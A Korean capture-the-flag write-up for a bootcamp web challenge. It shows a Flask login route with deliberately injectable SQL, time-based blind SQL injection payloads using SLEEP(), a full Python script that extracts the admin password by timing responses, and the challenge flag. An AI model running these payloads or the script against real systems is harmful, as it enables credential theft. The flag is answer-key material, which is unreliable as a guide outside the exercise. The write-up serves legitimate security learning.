---
title: "[Writeup] Knockon Bootcamp - 2.1 What time is it?"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Blind SQL Injection
  - Time based
last_modified_at: 2024-08-26T18:31:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10029/>

![2.1 What time is it? 1](/assets/images/writeup/web-hacking/knock-on/2-1_What_time_is_it_1.png)

![2. What time is it? 2](/assets/images/writeup/web-hacking/knock-on/1-1_SQL_Injection_2.png)

![2. What time is it? 3](/assets/images/writeup/web-hacking/knock-on/2-1_What_time_is_it_2.png)

|

|

|

### 목표

---

admin 계정의 password 알아내기

|

### 공격 기법

---

Blind SQL Injection

- Time based

|

|

|

## 문제 코드

```python
from flask import Flask, request, render_template, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import text
import os

app = Flask(__name__)

MYSQL_DATABASE = os.getenv('MYSQL_DATABASE')
MYSQL_USER = os.getenv('MYSQL_USER')
MYSQL_PASSWORD = os.getenv('MYSQL_PASSWORD')
MYSQL_HOST = 'db'

app.config['SQLALCHEMY_DATABASE_URI'] = f'mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(80), nullable=False)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    query = None
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        query = text(f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'")
        with db.engine.connect() as connection:
            try:
                result = connection.execute(query)
                result.fetchone()
            except:
                render_template('login.html', query=query)
            
    return render_template('login.html', query=query)

if __name__ == '__main__':
    db.create_all()
    app.run(debug=True, host='0.0.0.0', port=10003)
```

|

|

|

## 분석

### 메인 화면

---

```sql
admin' -- 1
```

![2. What time is it? 4](/assets/images/writeup/web-hacking/knock-on/2-1_What_time_is_it_3.png)

`admin`으로 로그인을 시도하거나, `‘`로 SQL Injection을 시도해봐도 화면에는 입력한 값반 반환될 뿐 페이지가 바뀌지 않음

|

|

### login()

---

```sql
try:
    result = connection.execute(query)
    result.fetchone()
except:
    render_template('login.html', query=query)
```

로그인 성공 여부와 관계 없이 입력한 값와 함께  `login.html`페이지로 리다이렉트됨

Time based Blind SQL Injection 기법을 활용해서 서버의 쿼리 응답 시간으로 비밀번호를 알아내야함

|

|

|

## Exploit

### 1. 비밀번호 길이 알아내기

---

`SLEEP()` 함수를 활용해야 함 

**`SLEEP()`** 

```sql
SLEEP(시간초)
```

```sql
SLEEP(5)
```

5초 대기 후 결과 반환

|

```sql
admin' and SLEEP(3) -- 1
```

![2. What time is it? 5](/assets/images/writeup/web-hacking/knock-on/2-1_What_time_is_it_4.png)

admin 계정이 존재한다면 3초 대기 후 페이지가 랜더링 됨

페이지가 바로 랜더링 되지 않고 3초 대기 되는 것을 보아 admin 계정이 존재함을 알 수 있음

|

```sql
admin' and LENGTH(password) = 1 and SLEEP(3) -- 1
```

비밀번호 길이를 구하는 쿼리에 결과 확인을 위한 3초 지연 추가

비밀번호 길이를 늘려가며 3초 지연이 되는 순간을 찾으면 비밀번호 길이를 찾을 수 있음

|

|

### 2. 비밀번호 찾기

---

```sql
admin' and ASCII(SUBSTRING(password, 1, 1)) = 32 and SLEEP(3) -- 1
```

마찬가지로 sleep을 활용하여 지연되는 순간을 찾으면 됨

|

|

### 자동화 코드: find_password_length

---

Boolean base의 코드에서 조금만 바꾸면 됨

1. sleep_time 추가
    
    너무 짧게 설정하면 의도와 다르게 나올 가능성이 있음
    
    ```python
    sleep_time = 2
    ```
    
    |
    
2. payload 수정

    `sleep()` 추가
    
    ```python
    payload= {"username": f"{username}' AND LENGTH(password) = {length} and sleep({sleep_time}) -- 1", "password": f"{password}"}
    ```
    
    |
    
3. 성공 로직 수정
    
    ```python
    if res.elapsed.total_seconds() > sleep_time:
    	return length
    ```

    설정한 sleep_time보다 서버 응답 시간이 클 때 `length`(비밀번호 길이) 반환
    
    `res`의 `elapsed`속성은 `timedelta` 객체임. 이는 요청이 시작된 시점부터 응답이 완료된 시점까지 걸린 시간을 나타냄
    
    |
    
4. 완성된 find_password_length
    
    ```python
    def find_password_length(url, username, password, sleep_time):
    	for length in range(0, 51): # 0부터 50까지
    		payload= {"username": f"{username}' AND LENGTH(password) = {length} AND SLEEP({sleep_time}) -- 1", "password": f"{password}"}
    		res = requests.post(url, data=payload)
    		if res.elapsed.total_seconds() > sleep:
    			return length
    ```
    

|

|

### 자동화 코드: find_password_length

---

1. payload 수정
    
    `SLEEP()` 추가
    
    ```python
    payload = {"username":f"{username}' AND ASCII(SUBSTRING(password, {length}, 1)) = {ascii_code} AND SLEEP({sleep_time}) -- 1", "password":f"{password}"}
    ```
    

1. 성공 로직 수정
    
    ```python
    if res.elapsed.total_seconds() > sleep_time:
    	string+= chr(ascii_code) # ascii 값을 문자로 변환
    	print(f"현재까지 알아낸 비밀번호: {string}")
    	break
    ```
    

|

|

|

## Payload

```sql
import requests

# 비밀번호 길이 찾기
def find_password_length(url, username, password, sleep_time):
	for length in range(0, 51): # 0부터 50까지
		payload= {"username": f"{username}' AND LENGTH(password) = {length} AND SLEEP({sleep_time}) -- 1", "password": f"{password}"}
		res = requests.post(url, data=payload)
		if res.elapsed.total_seconds() > sleep_time:
			return length

# 비밀번호 찾기
def find_password(url, password_length, username, password, sleep_time):
    string = ""
    for length in range(1, password_length+1): # 비밀번호 위치 (1부터 password_length까지)
        print(f"{length}번째 문자 탐색 중...")
        for ascii_code in range(32, 127): # 아스키 코드 32부터 126까지
            payload = {"username":f"{username}' AND ASCII(SUBSTRING(password, {length}, 1)) = {ascii_code} AND SLEEP({sleep_time}) -- 1", "password":f"{password}"}
            res = requests.post(url, data=payload)
            if res.elapsed.total_seconds() > sleep_time:
                string+= chr(ascii_code) # ascii 값을 문자로 변환
                print(f"현재까지 알아낸 비밀번호: {string}")
                break
    return string # 완성된 string 반환

url = "http://war.knock-on.org:10029/login"
username = "admin"
password = "1"
sleep_time = 2

password_length = find_password_length(url, username, password, sleep_time)
print(f"비밀번호 길이: {password_length}")

password_string = find_password(url, password_length, username, password, sleep_time)
print(f"완성된 비밀번호: {password_string}")
```

|

|

### Flag

---

```python
K0{I_like_intime}
```

|

---


